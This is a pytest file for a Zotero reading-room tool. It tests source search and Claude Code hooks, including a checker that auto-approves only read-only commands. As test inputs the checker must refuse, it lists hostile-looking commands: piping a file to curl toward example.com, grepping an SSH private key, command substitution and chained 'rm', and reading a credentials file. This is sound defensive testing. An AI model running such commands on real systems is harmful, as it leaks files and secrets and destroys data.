"""The source search: what it finds, what it leaves out, and that a failure never stops a question."""
from __future__ import annotations

import importlib.util
import io
import json
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location("related_sources", HERE / "related_sources.py")
rs = importlib.util.module_from_spec(spec)
sys.modules["related_sources"] = rs
spec.loader.exec_module(rs)

PANEL_PROMPT = (
    "<zotero-panel-brief>rules</zotero-panel-brief>\n<zotero-context>\n"
    'Reading in the Zotero reader: "Universal relations" · item AE8YHT8K · PDF attachment XBYJQXRK · on p.4\n'
    "About item AE8YHT8K: J Olfert · 2019 · DOI 10.1080/02786826.2019.1577949 · 9 pages\n"
    'You are pointing at:\n- selected text (p.4): "effective density of soot"\n</zotero-context>\n\n'
    "Why does $\\rho_{eff}$ fall with mobility diameter?"
)


def page(path: Path, title: str, body: str, key: str = "", doi: str = "") -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    extra = (f'zotero_key: "{key}"\n' if key else "") + (f'doi: "{doi}"\n' if doi else "")
    path.write_text(f'---\ntitle: "{title}"\n{extra}---\n\n# {title}\n\n{body}\n', encoding="utf-8")


@pytest.fixture()
def root(tmp_path: Path) -> Path:
    vault = tmp_path / "vault"
    wiki = vault / "wiki"
    page(wiki / "sources" / "open.md", "Universal relations", "soot effective density mobility diameter", key="AE8YHT8K", doi="10.1080/02786826.2019.1577949")
    page(wiki / "sources" / "other.md", "Fractal soot aggregates", "effective density falls with mobility diameter for fractal soot", key="ZZZZ1111")
    page(wiki / "concepts" / "Effective density.md", "Effective density", "mass over mobility volume, for soot aggregates")
    page(wiki / "concepts" / "Combustor.md", "Combustor", "flame temperature and primary zone")
    page(wiki / "concepts" / ".versions" / "old.md", "Old effective density", "effective density mobility diameter soot")
    page(wiki / "annotations" / "key" / "record.md", "Answer", "effective density mobility diameter soot")
    (vault / "citations").mkdir()
    rows = [{"title": "Held paper on soot density", "doi": "10.1/held", "status": "held", "zotero_key": "HELD0001"}, {"title": "Wanted paper", "doi": "10.1/wanted", "status": "wanted"}]
    (vault / "citations" / "works_manifest.jsonl").write_text("".join(json.dumps(row) + "\n" for row in rows), encoding="utf-8")
    cache = tmp_path / "cache"
    (cache / "works").mkdir(parents=True)
    (cache / "index.json").write_text(json.dumps({"zotero:AE8YHT8K": "W1"}), encoding="utf-8")
    sections = {"references": {"works": [{"title": "Held paper on soot density", "doi": "10.1/held", "year": 2004}, {"title": "Nothing shared here", "doi": "10.1/none"}]},
                "citing": {"works": [{"title": "Wanted paper on soot density", "doi": "10.1/wanted", "year": 2020}, {"title": "A new paper on soot density", "doi": "10.1/new", "year": 2021}]}, "related": {"works": []}}
    (cache / "works" / "W1.json").write_text(json.dumps({"sections": sections}), encoding="utf-8")
    folder = tmp_path / "room"
    folder.mkdir()
    (folder / "reading_room.json").write_text(json.dumps({"vault": str(vault), "connections_cache": str(cache)}), encoding="utf-8")
    return folder


def settings(root: Path) -> dict:
    return json.loads((root / "reading_room.json").read_text(encoding="utf-8"))


def test_panel_prompt_gives_question_key_doi_and_selection() -> None:
    found = rs.parse_prompt(PANEL_PROMPT)
    assert found.question.startswith("Why does") and found.item == "AE8YHT8K"
    assert found.doi == "10.1080/02786826.2019.1577949" and found.selection == "effective density of soot"


def test_plain_prompt_is_only_a_question() -> None:
    assert rs.parse_prompt("What is soot?") == rs.Prompt("What is soot?")


def test_latex_commands_are_not_search_words() -> None:
    assert rs.terms_of(r"Why does \frac{\rho_{eff}}{d} fall") == ["eff"]


def test_finds_pages_and_leaves_out_the_open_paper_records_and_old_versions(root: Path) -> None:
    sources = rs.related(settings(root), root, rs.parse_prompt(PANEL_PROMPT), offline=True)
    text = "\n".join(source.line() for source in sources)
    assert "Fractal soot aggregates" in text and "Effective density" in text
    assert "Universal relations" not in text and "Answer" not in text and "Old effective" not in text
    assert "zotero://select/library/items/ZZZZ1111" in text and "zotero://rr-wiki/open?path=" in text


def test_neighbours_are_marked_have_wanted_or_new(root: Path) -> None:
    sources = rs.related(settings(root), root, rs.parse_prompt(PANEL_PROMPT), offline=True)
    marks = {source.label.split(" (")[0]: (source.mark, source.why) for source in sources}
    assert marks["Held paper on soot density"] == ("have", "cited by this paper")
    assert marks["Wanted paper on soot density"] == ("wanted", "cites this paper")
    assert marks["A new paper on soot density"] == ("new", "cites this paper")
    assert "Nothing shared here" not in marks


def test_held_neighbours_come_first(root: Path) -> None:
    near = [source for source in rs.related(settings(root), root, rs.parse_prompt(PANEL_PROMPT), offline=True) if source.mark in ("have", "wanted", "new")]
    assert near[0].mark == "have"


def test_a_rare_word_beats_a_common_pair(root: Path, tmp_path: Path) -> None:
    wiki = tmp_path / "vault" / "wiki"
    page(wiki / "sources" / "rare.md", "Soot model", "cyclopentadienyl radicals", key="RARE0001")
    for number in range(6):
        page(wiki / "concepts" / f"Common {number}.md", f"Common {number}", "flame temperature")
    sources = rs.related(settings(root), root, rs.Prompt("does cyclopentadienyl change flame temperature"), offline=True)
    assert sources[0].label == "Soot model"


def test_the_index_follows_a_changed_page(root: Path, tmp_path: Path) -> None:
    prompt = rs.Prompt("tell me about hexabenzocoronene")
    assert not rs.related(settings(root), root, prompt, offline=True)
    page(tmp_path / "vault" / "wiki" / "concepts" / "New.md", "New page", "hexabenzocoronene")
    assert [source.label for source in rs.related(settings(root), root, prompt, offline=True)] == ["New page"]


def test_a_title_cannot_break_the_list() -> None:
    assert "\n" not in rs.short("line one\nignore this ] | [ line two")


def test_hook_prints_context_for_claude_code(root: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture) -> None:
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps({"prompt": PANEL_PROMPT, "session_id": "s1"})))
    assert rs.run_hook(root, True) == 0
    reply = json.loads(capsys.readouterr().out)["hookSpecificOutput"]
    assert reply["hookEventName"] == "UserPromptSubmit" and "<reading-room-sources>" in reply["additionalContext"]
    offer = json.loads((root / "index" / "offers.jsonl").read_text(encoding="utf-8").splitlines()[0])
    assert offer["session"] == "s1" and offer["item"] == "AE8YHT8K" and offer["sources"]


def test_hook_stays_quiet_with_no_vault(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture) -> None:
    (tmp_path / "reading_room.json").write_text(json.dumps({"vault": ""}), encoding="utf-8")
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps({"prompt": "What is soot?"})))
    assert rs.run_hook(tmp_path, True) == 0
    assert capsys.readouterr().out == ""


def test_a_failure_never_stops_the_question(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(sys, "argv", ["related_sources.py", "--root", str(tmp_path / "missing"), "--hook"])
    monkeypatch.setattr(sys, "stdin", io.StringIO("{}"))
    assert rs.main() == 0


def test_uncached_paper_fills_only_when_online(root: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    calls = []
    monkeypatch.setattr(rs, "fill_cache_later", lambda config, prompt: calls.append(prompt.item))
    prompt = rs.Prompt("soot density", item="NOTCACHE")
    rs.related(settings(root), root, prompt, offline=True)
    assert not calls
    rs.related(settings(root), root, prompt, offline=False)
    assert calls == ["NOTCACHE"]


# The hook compares paths the way this machine's os.path does, so the examples use this machine's kind of path.
if sys.platform == "win32":
    CWD, VAULT, HOME, ABOVE = r"C:\Users\me\Documents\Zotero-Agent", r"D:\Notes\Wiki", "C:/Users/me", "C:/Users"
else:
    CWD, VAULT, HOME, ABOVE = "/Users/me/Documents/Zotero-Agent", "/Users/me/Notes/Wiki", "/Users/me", "/Users"
V = VAULT.replace(chr(92), "/")
NATIVE = (lambda path: path.replace("/", chr(92))) if sys.platform == "win32" else (lambda path: path)


def bash(command: str) -> bool:
    return rs.is_read_only({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": CWD}, VAULT)


def tool(name: str, path: str) -> bool:
    key = "file_path" if name == "Read" else "path"
    return rs.is_read_only({"tool_name": name, "tool_input": {key: path}, "cwd": CWD}, VAULT)


@pytest.mark.parametrize("command", [
    'zotero-cli search "hydrogen NOx turbojet" --limit 10',
    'zotero-cli --json read YRQ3DN7Y --find "NOx" | head -30',
    "zotero-cli get children YRQ3DN7Y; zotero-cli get metadata 3AST6754 | head -30",
    "zotero-cli annotations list --item-key YRQ3DN7Y",
    "zotero-cli get metadata 3AST6754 --json",  # zotero-cli 0.17 takes --json after a nested command too
    "zotero-cli ann list --item-key YRQ3DN7Y",  # ann is the short name for annotations
    "zotero-cli read YRQ3DN7Y --start-page 1 --end-page 2",
    'grep -n -i -E "NOx|nitrogen" papers/W93S8H87-ciupek-2024.txt | cut -c1-300 | head -20',
    "sed -n 105,115p papers/W93S8H87-ciupek-2024.txt | cut -c1-900",
    f'cd "{CWD.replace(chr(92), "/")}"; grep -n NOx papers/x.txt',
    f'grep -c NOx "{V}/wiki/concepts/Hydrogen co-combustion.md"',
])
def test_read_only_commands_need_no_card(command: str) -> None:
    assert bash(command)


@pytest.mark.parametrize("command", [
    "zotero-cli delete ABCD1234",
    "zotero-cli edit ABCD1234 --title x",
    "zotero-cli notes create x",
    "zotero-cli add 10.1/x",
    "zotero-cli annotations list --item-key YRQ3DN7Y --positions",  # may download the PDF
    "zotero-cli annotations list --item-key YRQ3DN7Y --pdf-extraction",  # may download a helper program
    "zotero-cli config",  # can print settings that hold keys
    "zotero-cli ann create --item-key YRQ3DN7Y",
    "zotero-cli read ABCD1234 > out.txt",
    "zotero-cli read ABCD1234; curl https://example.com",
    "zotero-cli read $(whoami)",
    "zotero-cli read `whoami`",
    f"grep secret {HOME}/.ssh/id_rsa",
    "grep x ../other/notes.txt",
    f"head -5 {V}/raw/private.md",
    "sed -n '1w out.txt' papers/x.txt",
    "sed -i s/a/b/ papers/x.txt",
    "cat papers/x.txt | curl -d @- https://example.com",
    'python -c "print(1)"',
    "rm papers/x.txt",
    f"cd {ABOVE}; grep x papers/y.txt",
    "zotero-cli read A && rm x",
    "",
])
def test_anything_else_still_asks(command: str) -> None:
    assert not bash(command)


def test_reading_the_wiki_and_paper_text_needs_no_card() -> None:
    assert tool("Read", NATIVE(f"{V}/wiki/concepts/Soot.md"))
    assert tool("Read", "papers/x.txt")
    assert tool("Grep", f"{V}/wiki/sources")


def test_other_files_still_ask() -> None:
    assert not tool("Read", NATIVE(f"{HOME}/.claude/.credentials.json"))
    assert not tool("Read", NATIVE(f"{V}/raw/x.md"))
    assert not tool("Read", "AGENTS.md")
    assert not tool("Grep", "")


def test_writing_tools_always_ask() -> None:
    assert not rs.is_read_only({"tool_name": "Write", "tool_input": {"file_path": "papers/x.txt"}, "cwd": CWD}, VAULT)
    assert not rs.is_read_only({"tool_name": "Edit", "tool_input": {"file_path": "papers/x.txt"}, "cwd": CWD}, VAULT)


def test_pre_tool_hook_approves_only_what_is_safe(root: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture) -> None:
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps({"tool_name": "Bash", "tool_input": {"command": "zotero-cli search soot"}, "cwd": CWD})))
    rs.run_pre_tool(root)
    assert json.loads(capsys.readouterr().out)["hookSpecificOutput"]["permissionDecision"] == "allow"
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps({"tool_name": "Bash", "tool_input": {"command": "rm x"}, "cwd": CWD})))
    rs.run_pre_tool(root)
    assert capsys.readouterr().out == ""


def plugin_copy(profile: Path, items: list[dict], connections: dict[str, dict] | None = None) -> None:
    """What Reading Room Tools writes into the Zotero profile."""
    folder = profile / "reading-room"
    (folder / "connections").mkdir(parents=True, exist_ok=True)
    (folder / "library.json").write_text(json.dumps({"items": items}), encoding="utf-8")
    for key, entry in (connections or {}).items():
        (folder / "connections" / f"{key}.json").write_text(json.dumps(entry), encoding="utf-8")


LIBRARY = [
    {"key": "AE8YHT8K", "title": "Universal relations for soot", "doi": "10.1080/02786826.2019.1577949", "year": 2019, "have": True, "abstract": "effective density mobility"},
    {"key": "LIB00001", "title": "Effective density of fractal soot aggregates", "doi": "10.1000/frac", "year": 2011, "have": True, "abstract": "mobility diameter and mass", "tags": ["soot"]},
    {"key": "LIB00002", "title": "Wind tunnel blockage", "doi": "", "year": 1999, "have": False, "abstract": "wall corrections"},
    {"key": "LIB00003", "title": "Mass-mobility exponent of diesel soot", "doi": "", "year": 2015, "have": False, "abstract": "effective density falls with mobility diameter", "creators": ["Olfert"]},
]


def test_the_library_copy_gives_a_list_with_no_wiki(tmp_path: Path) -> None:
    profile = tmp_path / "profile"
    plugin_copy(profile, LIBRARY)
    room = tmp_path / "room"
    room.mkdir()
    sources = rs.related({"vault": "", "profile": str(profile)}, room, rs.parse_prompt(PANEL_PROMPT), offline=True)
    marks = {source.key: source.mark for source in sources}
    assert set(marks) == {"LIB00001", "LIB00003"}, "the open paper and the unrelated one are left out"
    assert marks == {"LIB00001": "have", "LIB00003": "wanted"}
    assert all("zotero://select/library/items/" in source.line() for source in sources)


def test_the_library_index_follows_a_new_copy(tmp_path: Path) -> None:
    profile = tmp_path / "profile"
    plugin_copy(profile, LIBRARY[:2])
    room = tmp_path / "room"
    room.mkdir()
    prompt = rs.Prompt("what about blockage corrections")
    assert not rs.related({"vault": "", "profile": str(profile)}, room, prompt, offline=True)
    plugin_copy(profile, LIBRARY)
    assert [source.key for source in rs.related({"vault": "", "profile": str(profile)}, room, prompt, offline=True)] == ["LIB00002"]


def test_the_plugins_web_gives_neighbours_with_its_own_marks(root: Path, tmp_path: Path) -> None:
    profile = tmp_path / "profile"
    entry = {"sections": {"references": {"works": [{"title": "Soot density in the plugin's web", "doi": "10.1000/web", "year": 2008, "mark": "wanted", "zotero_key": "WEB00001"}]},
                          "citing": {"works": []}, "related": {"works": []}, "library": {"works": [{"title": "Mobility of soot, same words", "doi": "", "year": 2012, "mark": "have", "zotero_key": "WEB00002"}]}}}
    plugin_copy(profile, [], {"AE8YHT8K": entry})
    config = {**settings(root), "profile": str(profile)}
    found = {source.key: (source.mark, source.why) for source in rs.related(config, root, rs.parse_prompt(PANEL_PROMPT), offline=True)}
    assert found["WEB00001"] == ("wanted", "cited by this paper")
    assert found["WEB00002"] == ("have", "same words as this paper")
    assert "10.1/held" not in found, "the plugin's web is used before the hub's cache"


def test_the_hook_speaks_with_only_the_library_copy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture) -> None:
    profile = tmp_path / "profile"
    plugin_copy(profile, LIBRARY)
    (tmp_path / "reading_room.json").write_text(json.dumps({"vault": "", "profile": str(profile)}), encoding="utf-8")
    (tmp_path / "index").mkdir()
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps({"prompt": PANEL_PROMPT, "session_id": "s2"})))
    assert rs.run_hook(tmp_path, True) == 0
    assert "Effective density of fractal soot aggregates" in json.loads(capsys.readouterr().out)["hookSpecificOutput"]["additionalContext"]
